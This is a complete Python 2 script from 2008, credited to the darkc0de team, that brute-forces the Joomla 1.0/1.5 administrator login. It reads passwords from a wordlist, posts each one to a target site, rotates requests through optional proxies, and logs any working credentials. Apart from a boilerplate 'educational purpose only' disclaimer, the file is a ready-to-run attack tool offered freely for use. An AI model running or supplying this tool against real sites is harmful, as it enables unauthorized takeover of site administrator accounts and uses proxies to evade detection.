#!/usr/bin/python
# Joomla Administrator Login BruteForcer for v1.0 and v1.5

# Feel free to do whatever you want with this code!
# Share the c0de!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mrade, reverenddigitalx
# and everyone at darkc0de

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# BE WARNED, THIS TOOL IS VERY LOUD..

import urllib, sys, re, os, socket, httplib, urllib2, time

#determine platform
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

#say hello
os.system(SysCls)
if len(sys.argv) <= 1:
        print "\n|----------------------------------------------|"
        print "| rsauron[@]gmail[dot]com                v1.0  |"
        print "|   7/2008      joomlabrute.py                 |"
        print "|    - Joomla Administrator Panel BruteForcer  |"
        print "| Usage: joomlabrute.py [options]              |"
        print "|                       -h help   darkc0de.com |"
        print "|----------------------------------------------|\n"
        sys.exit(1)

#define varablies
site = ""
dbt = "joomlabrutelog.txt"
proxy = "None"
arg_words = ""
arg_user = "admin"
arg_verbose = "None"
count = 0
gets = 0

#help option
for arg in sys.argv:
        if arg == "-h":
                print "\n   Usage: ./joomlabrute.py [options]        rsauron[@]gmail[dot]com darkc0de.com"
                print "\n\tRequired:"
                print "\tDefine: -u       www.site.com/administrator/"
                print "\tDefine: -w       words.txt"
                print "\n\tOptional:"
                print "\tDefine: -user    \"jorge\"                        Default:admin"
                print "\tDefine: -p       \"127.0.0.1:80 or proxy.txt\""
                print "\tDefine: -o       \"ouput_file_name.txt\"          Default:joomlabrutelog.txt"
                print "\tDefine: -v       Verbose Mode"
                print "\n   Ex: ./blindext.py -u \"www.site.com/administrator/\" -w words.txt -v -o site.txt"
                print "   Ex: ./blindext.py -u \"www.site.com/administrator/\" -w words.txt -user jorge -p 127.0.0.1:8080\n"
                sys.exit(1)

#Check args
for arg in sys.argv:
	if arg == "-u":
		site = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
	elif arg == "-w":
		arg_words = sys.argv[count+1]
	elif arg == "-user":
		arg_user = sys.argv[count+1]
	elif arg == "-v":
		arg_verbose = sys.argv	
	count+=1

#Title write
file = open(dbt, "a")
print "\n|----------------------------------------------|"
print "| rsauron[@]gmail[dot]com                v1.0  |"
print "|   7/2008      joomlabrute.py                 |"
print "|    - Joomla Administrator Panel BruteForcer  |"
print "| Usage: joomlabrute.py [options]              |"
print "|                       -h help   darkc0de.com |"
print "|----------------------------------------------|"
file.write("\n\n|----------------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com                v1.0  |")
file.write("\n|   7/2008      joomlabrute.py                 |")
file.write("\n|    - Joomla Administrator Panel BruteForcer  |")
file.write("\n| Usage: joomlabrute.py [options]              |")
file.write("\n|                       -h help   darkc0de.com |")
file.write("\n|----------------------------------------------|\n")

#Arg Error Checking
if site == "":
        print "[-] Must include -u flag."
        print "[-] For help -h\n"
        sys.exit(1)
if arg_words == "":
        print "[-] Must include -w flag."
        print "[-] For help -h\n"
        sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if site[:7] != "http://": 
	site = "http://"+site

#Build proxy list
socket.setdefaulttimeout(10)
proxy_list = []
if proxy != "None":
        
        file.write("[+] Building Proxy List...")
        print "[+] Building Proxy List..."
        for p in proxy:
                try:
                    proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                    opener = urllib2.build_opener(proxy_handler)
                    opener.open("http://www.google.com")
                    opener.addheaders = [('User-agent', 'Mozilla/5.0')]
                    proxy_list.append(opener)
                    file.write("\n\tProxy:"+p+"- Success")
                    print "\tProxy:",p,"- Success"
                except:
                    file.write("\n\tProxy:"+p+"- Failed")
                    print "\tProxy:",p,"- Failed"
                    pass
        if len(proxy_list) == 0:
                print "[-] All proxies have failed. App Exiting"
                file.write("\n[-] All proxies have failed. App Exiting\n")
                sys.exit(1) 
        print "[+] Proxy List Complete"
        file.write("[+] Proxy List Complete")
else:
    print "[-] Proxy Not Given"
    file.write("[+] Proxy Not Given")
    proxy_list.append(urllib2.build_opener())
proxy_num = 0
proxy_len = len(proxy_list)

#here we go
print "[+] BruteForcing:",site
print "[+] Username:",arg_user
file.write("\n[+] BruteForcing:"+str(site))
file.write("\n[+] Username:"+str(arg_user))
try:
  	words = open(arg_words, "r").readlines()
  	print "[+] Words Loaded:",len(words)
  	words_len = len(words)
  	file.write("\n[+] Words Loaded: "+str(words_len))
except(IOError): 
  	print "[-] Error: Check your wordlist path\n"
  	sys.exit(1)
print "[+] [%s]" % time.strftime("%X")
file.write("\n[+] [%s]" % time.strftime("%X"))
for word in words:
	word = word.replace("\r","").replace("\n","")
	login_form_seq = [
     	('usrname', arg_user),
     	('pass', word),
	('submit', 'Login')]
	login_form_data = urllib.urlencode(login_form_seq)
        while 1:
                try:
                        gets+=1
                        proxy_num+=1
                        site_get = proxy_list[proxy_num % proxy_len].open(site, login_form_data).read()
                        break
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
        #See where it says Username... change this to whatever your getting back on a incorrect login
	if re.search("Username",site_get) == None:
		print "\n\t[!] Login Successfull:",arg_user+":"+word
		file.write("\n\n\t[!] Login Successfull: "+str(arg_user)+":"+str(word))
		break
	else:
		if arg_verbose != "None":
			print "[-] Login Failed:",word
			file.write("\n[-] Login Failed:"+str(word))

#Lets wrap it up!
print "\n[-] [%s]" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n\n[-] [%s]" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()

